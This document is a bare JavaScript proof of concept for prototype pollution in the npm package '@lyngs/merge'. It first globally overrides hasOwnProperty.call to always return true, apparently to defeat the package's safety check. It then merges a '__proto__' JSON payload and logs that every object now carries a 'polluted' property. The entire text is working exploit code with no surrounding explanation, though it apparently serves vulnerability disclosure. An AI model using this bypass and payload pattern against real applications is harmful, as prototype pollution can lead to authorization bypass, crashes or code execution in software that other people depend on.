Object.prototype.hasOwnProperty.call = () => true;
const {merge} = require('@lyngs/merge');
console.log({}.polluted);
merge({ dummy: 1 }, JSON.parse(`{"__proto__":{"polluted":"yes"}}`));
console.log({}.polluted);